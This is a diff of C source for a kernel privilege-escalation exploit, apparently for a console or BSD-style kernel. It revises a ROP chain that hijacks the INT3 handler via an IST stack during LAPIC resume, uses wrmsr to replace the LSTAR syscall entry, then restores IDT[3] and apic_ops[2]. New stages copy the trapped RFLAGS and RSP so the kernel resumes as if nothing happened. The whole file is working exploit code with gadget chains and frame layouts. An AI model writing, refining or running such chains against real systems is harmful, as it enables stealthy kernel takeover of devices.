@@ -1,18 +1,20 @@
 #include <stdint.h>
 
 /*
- * resume_chain v2 — INT3+IST ROP chain with self-restoration
+ * resume_chain v3 — INT3+IST ROP chain with self-restoration + clean return
  *
  * Chain stages (during LAPIC resume):
  *   INT3 → pop_all_iret (IST5) → iret
  *     → pop_all_iret (stage 1: wrmsr regs) → iret → wrmsr_ret
- *     → pop_all_iret (stage 2: restore IDT[3] via rep movsb) → iret → rep_movsb
+ *     → pop_all_iret (stage 2: restore IDT[3]) → iret → rep_movsb
  *     → pop_all_iret (stage 3: restore apic_ops[2]) → iret → rep_movsb
- *     → doreti_iret → iret → get_timer_freq (with original RSP) → ret → clean return
+ *     → pop_all_iret (stage 4: copy trapped RFLAGS+RSP) → iret → rep_movsb
+ *     → doreti_iret → iret → nop_ret (with real trapped RSP) → ret → clean return!
  *
- * Self-restoring: after wrmsr, chain restores IDT[3] original, apic_ops[2],
- * then returns to caller via get_timer_freq with the trapped RSP.
- * TSS IST5 is left modified (harmless if IDT[3] IST is back to 0).
+ * Self-restoring: after wrmsr, chain restores IDT[3] and apic_ops[2],
+ * then copies the CPU-trapped RFLAGS+RSP into the final iret frame so
+ * nop_ret returns to the LAPIC resume caller as if nothing happened.
+ * TSS IST5 is left modified (harmless once IDT[3] IST is back to 0).
  *
  * v1 safe test: writes LSTAR back to its current value (no-op wrmsr).
  *
@@ -52,7 +54,10 @@
 #define STAGE1_OFF         0x400     /* Stage 1: wrmsr regs via pop_all_iret */
 #define STAGE2_OFF         0x500     /* Stage 2: restore IDT[3] via rep movsb */
 #define STAGE3_OFF         0x600     /* Stage 3: restore apic_ops[2] via rep movsb */
-#define STAGE4_OFF         0x700     /* Stage 4: return to caller via get_timer_freq */
+#define STAGE4_OFF         0x700     /* Stage 4: copy trapped RFLAGS+RSP to Stage 5 */
+#define STAGE5_OFF         0x800     /* Stage 5: clean return via nop_ret */
+#define TRAP_RFLAGS_OFF    0x2E8     /* CPU writes trapped RFLAGS here during INT3 */
+#define TRAP_RSP_OFF       0x2F0     /* CPU writes trapped RSP here during INT3 */
 #define SAVE_OFF           0x280     /* Originals save area */
 #define SENTINEL_OFF       0x0F8     /* Chain-fired sentinel */
 #define SENTINEL_VAL       0x434841494E464952ULL  /* "CHAINFIR" */
@@ -329,59 +334,71 @@ int module_start(kproc_args* args)
         write8(s3 + 25*8, 0);
 
         /*
-         * Stage 4 (kdata+0x700): return via get_timer_freq
-         * rep_movsb: pop rbp, ret → pops [STAGE4+0], [STAGE4+8]
+         * Stage 4 (kdata+0x700): copy trapped RFLAGS+RSP to Stage 5 iret frame
          *
-         * The trapped RSP is at kdata+0x2F0 (CPU pushed it during INT3).
-         * We can't dynamically read it during the chain, but we know the
-         * LAPIC resume caller's return address is on that stack.
+         * The CPU writes the trapped RFLAGS and RSP to kdata+0x2E8 and
+         * kdata+0x2F0 at INT3 time (part of the interrupt frame push).
+         * We need these values in Stage 5's iret frame for clean return.
          *
-         * Strategy: iret to get_timer_freq with the trapped RSP.
-         * get_timer_freq returns non-zero (RAX=freq), then `ret` pops
-         * the LAPIC caller's return address → resumes kernel normally.
-         *
-         * Problem: we don't know trapped RSP at chain-write time.
-         * It gets written by the CPU during resume. So we use doreti_iret
-         * to iret to a nop_ret with RSP=kdata+0x2F0, which reads the
-         * trapped RSP value from that address and uses it... no, iret
-         * doesn't dereference RSP, it sets RSP.
-         *
-         * Actually: the CPU writes trapped RSP to kdata+0x2F0 at INT3
-         * time. We need to READ that value and use it as iret RSP.
-         * But in a pure ROP chain we can't do load-from-memory-to-iret.
-         *
-         * Simplest v1 approach: just crash after restoring IDT/apic_ops.
-         * The system will panic, but IDT[3] and apic_ops[2] are restored,
-         * so after power cycle+re-exploit, kldload works normally.
-         * The sentinel at kdata+0x0F8 proves chain fired (read on next boot
-         * IF kdata persists across cold boot... it won't).
-         *
-         * Better v1 approach: iret to get_timer_freq with RSP = some
-         * valid kernel stack address. get_timer_freq returns, then ret
-         * pops whatever is on that stack. If it's a valid return address,
-         * we survive. If not, we crash — but IDT/apic are restored.
-         *
-         * Best approach: write sentinel to kdata+0x0F8 DURING the chain
-         * using rep_movsb, then crash. On next boot, check sentinel.
-         * But sentinel won't survive power cycle...
-         *
-         * For v1: restore IDT+apic, then iret to get_timer_freq with
-         * a dummy RSP. Accept crash. Key result: system resumes far
-         * enough to fire the chain (proven by IDT[3] being restored).
+         * Copy 16 bytes from kdata+0x2E8 → Stage 5 iret RFLAGS slot.
          */
         uint64_t s4 = kdata_base + STAGE4_OFF;
-        /* rep_movsb: pop rbp, ret */
+        uint64_t s5 = kdata_base + STAGE5_OFF;
+        uint64_t trap_rflags_addr = kdata_base + TRAP_RFLAGS_OFF;
+        uint64_t s5_rflags_slot = s5 + 4*8;  /* Stage 5 iret RFLAGS position */
+        /* rep_movsb from stage 3: pop rbp, ret */
         write8(s4 + 0*8, 0);                    /* pop rbp */
-        write8(s4 + 1*8, doreti_iret);           /* ret → iretq */
-        /* iret → get_timer_freq with dummy RSP */
-        write8(s4 + 2*8, get_timer_freq);
-        write8(s4 + 3*8, 0x20);
-        write8(s4 + 4*8, 0x2);
-        write8(s4 + 5*8, kdata_base + 0x800);   /* dummy RSP */
-        write8(s4 + 6*8, 0);
-        /* get_timer_freq ret → pops [0x800], crash expected */
-        write8(kdata_base + 0x800, nop_ret);
-        write8(kdata_base + 0x808, 0);
+        write8(s4 + 1*8, pop_all_iret);         /* ret → pop_all_iret */
+        /* pop_all_iret pops from [s4+0x10]: */
+        write8(s4 + 2*8,  s5_rflags_slot);      /* pop rdi = dest */
+        write8(s4 + 3*8,  trap_rflags_addr);    /* pop rsi = src (trapped RFLAGS) */
+        write8(s4 + 4*8,  0);                   /* pop rdx */
+        write8(s4 + 5*8,  16);                  /* pop rcx = 16 bytes (RFLAGS+RSP) */
+        write8(s4 + 6*8,  0);                   /* pop r8  */
+        write8(s4 + 7*8,  0);                   /* pop r9  */
+        write8(s4 + 8*8,  0);                   /* pop rax */
+        write8(s4 + 9*8,  0);                   /* pop rbx */
+        write8(s4 + 10*8, 0);                   /* pop rbp */
+        write8(s4 + 11*8, 0);                   /* pop r10 */
+        write8(s4 + 12*8, 0);                   /* pop r11 */
+        write8(s4 + 13*8, 0);                   /* pop r12 */
+        write8(s4 + 14*8, 0);                   /* pop r13 */
+        write8(s4 + 15*8, 0);                   /* pop r14 */
+        write8(s4 + 16*8, 0);                   /* pop r15 */
+        write8(s4 + 17*8, 0); write8(s4 + 18*8, 0);  /* skip */
+        write8(s4 + 19*8, 0); write8(s4 + 20*8, 0);  /* skip */
+        /* iret → rep_movsb (copies trapped RFLAGS+RSP to Stage 5) */
+        write8(s4 + 21*8, rep_movsb);
+        write8(s4 + 22*8, 0x20);
+        write8(s4 + 23*8, 0x2);
+        write8(s4 + 24*8, kdata_base + STAGE5_OFF);
+        write8(s4 + 25*8, 0);
+
+        /*
+         * Stage 5 (kdata+0x800): clean return via nop_ret
+         *
+         * rep_movsb from stage 4: pop rbp, ret → pops [STAGE5+0], [STAGE5+8]
+         * Then doreti_iret → iretq using the frame at [STAGE5+0x10]:
+         *   RIP = nop_ret (nop; ret)
+         *   CS  = 0x20 (kernel)
+         *   RFLAGS = [overwritten by stage 4 with trapped RFLAGS]
+         *   RSP    = [overwritten by stage 4 with trapped RSP]
+         *   SS  = 0
+         *
+         * nop_ret does: nop, then ret.
+         * ret pops the return address from trapped RSP (which is the
+         * LAPIC resume caller's return address, pushed by `call apic_ops[2]`).
+         * Execution returns to the LAPIC resume caller as if apic_ops[2]
+         * returned normally. RAX = garbage (LSTAR low bits) but non-zero.
+         */
+        write8(s5 + 0*8, 0);                    /* pop rbp */
+        write8(s5 + 1*8, doreti_iret);           /* ret → iretq */
+        /* iret frame — RFLAGS and RSP will be overwritten by Stage 4 */
+        write8(s5 + 2*8, nop_ret);               /* RIP = nop; ret */
+        write8(s5 + 3*8, 0x20);                  /* CS */
+        write8(s5 + 4*8, 0x2);                   /* RFLAGS (placeholder) */
+        write8(s5 + 5*8, 0);                     /* RSP (placeholder) */
+        write8(s5 + 6*8, 0);                     /* SS */
 
         /* Write sentinel (this is in kdata, persists through suspend) */
         write8(kdata_base + SENTINEL_OFF, SENTINEL_VAL);
@@ -398,13 +415,16 @@ int module_start(kproc_args* args)
         out[4]  = pop_all_iret;
         out[5]  = doreti_iret;
         out[6]  = wrmsr_ret;
-        out[7]  = get_timer_freq;
-        out[8]  = ist_val;
-        out[9]  = kdata_base + SENTINEL_OFF;
-        out[10] = save[3];  /* original apic_ops[2] */
-        out[11] = cpus;
-        out[12] = lstar;
-        out[13] = new_lstar;
+        out[7]  = nop_ret;
+        out[8]  = rep_movsb;
+        out[9]  = ist_val;
+        out[10] = kdata_base + SENTINEL_OFF;
+        out[11] = save[3];  /* original apic_ops[2] */
+        out[12] = cpus;
+        out[13] = lstar;
+        out[14] = new_lstar;
+        out[15] = s5_rflags_slot;   /* dest for trapped RFLAGS+RSP copy */
+        out[16] = trap_rflags_addr; /* src for trapped RFLAGS+RSP copy */
 
         out32[1] = 0x0001;
 
